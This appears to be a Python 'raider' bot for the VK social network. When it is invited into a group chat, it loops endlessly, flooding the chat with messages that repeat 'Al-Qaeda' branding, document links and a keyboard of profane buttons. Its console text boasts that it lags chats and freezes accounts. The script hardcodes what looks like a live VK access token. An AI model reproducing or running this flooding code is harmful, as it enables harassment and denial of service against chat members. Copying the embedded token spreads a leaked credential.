print ('𝚁𝙰𝙸𝙳𝙴𝚁 𝙶𝙻𝙰 2.0        ₳Ʉ₮ⱧØⱤ: ₳Ⱡł ₳Ⱨ₥ɎĐ,V₭: ₴ⱧɆłⱧ_₳Ⱡł_₳Ⱨ₥ɎĐ,добавляй HOIC в чат')
# -*- coding: utf-8 -*-
from re import I
import vk_api
import json
import random
import time
from vk_api.bot_longpoll import VkBotLongPoll, VkBotEventType
from vk_api.keyboard import VkKeyboard, VkKeyboardColor


vk = vk_api.VkApi(token='vk1.a.JAZkpmfCOvMvTYMnpnNfYyfYXStYMJwVRMfyAYnyfIPeaZY3bmgDqO2rn1Bk1v2fBLdNn5Mwe7TIYAkakPzp6NkXdjva4aKPjQmgMiOyHkMgin2N97TZF9NucpTD-ahvyxFw-REtUODUpUThwBnAsYPOOwomM97hHHjjJU0762jKSb9yyvxEx6qZO4Y4AkBB') 
vk._auth_token()
vk.get_api()
def get_random_id():
    return random.randint(0, 100000000000)

group_id = '214432926' 

longpoll = VkBotLongPoll(vk, group_id)
bot_help = '''

'''

print(bot_help)
for event in longpoll.listen():
   if event.type == VkBotEventType.MESSAGE_NEW:
            d1 = event.object.message
            s1 = json.dumps(d1)
            d2 = json.loads(s1)

            json_object = d2
            message = json_object['text']

            message = message.split("alkaida")
            msg_text = event.object.message['text']
            str1 = message[0].split("|")[0]


            str1 = str1.replace("club", "alkaida")
            if group_id == str1:
                message.pop(0)

            message = 'AL-KAIDA'.join(message).lower()

            id = json_object['peer_id']
            try:
                dey = event.message.action['type']
            except:
                dey = ''
            
            print(message)
            print ('итак пушка в чате')
            print ('бот очень мощный,от него все дико лагает,также он может сморозить аккич')
            print ('учти,ботяра шустрый, на 1 к флуд контроль,но не беда,жди от 10 минут и опять')
            f = input ('нажми ентер чтобы взорвать жопу чату:')
            print ('*звуки ядерной сирены...*')
            if dey == 'chat_invite_user':
                while True:
                    keyboard = VkKeyboard()
                    keyboard.add_button('стоп машина https://vto.pe vto.pe', VkKeyboardColor.NEGATIVE)
                    keyboard.add_button('сила https://vto.pe vto.pe', VkKeyboardColor.NEGATIVE)
                    keyboard.add_button('мощность https://vto.pe vto.pe', VkKeyboardColor.NEGATIVE)
                    keyboard.add_button('AL-KAIDA https://vto.pe vto.pe', VkKeyboardColor.NEGATIVE)
                    keyboard.add_button('получить пизды https://vto.pe vto.pe', VkKeyboardColor.NEGATIVE)
                    keyboard.get_keyboard()
                    vk.method("messages.send", {"peer_id": id, 'random_id':get_random_id(), "message": f"Аль-Каида https://vk.com/doc738868546_640793677 AL-KAIDA AL DA ID AL-KAIDA AL DA ID AL-KAIDA AL DA ID AL-KAIDA AL DA ID AL-KAIDA AL DA ID AL-KAIDA AL DA ID AL-KAIDA AL https://vk.com/doc738868546_640793677 DA ID AL-KAIDA AL DA ID AL-KAIDA AL DA ID AL-KAIDA AL DA ID AL-KAIDA AL DA ID AL-KAIDA AL DA ID AL-KAIDA AL DA ID AL-KAIDA AL DA ID AL-KAIDA https://vk.com/doc738868546_640793677 AL DA ID AL-KAIDA AL DA ID AL-KAIDA AL DA ID AL-KAIDA AL DA ID AL-KAIDA AL DA ID AL-KAIDA AL DA ID AL-KAIDA AL DA ID AL-KAIDA AL DA ID https://vk.com/doc738868546_640793677 AL-KAIDA AL DA ID AL-KAIDA AL DA IDA", "attachment": 'wall-210968544_28, https://vk.com/doc738868546_640793677',"keyboard": keyboard.get_keyboard()})
                   

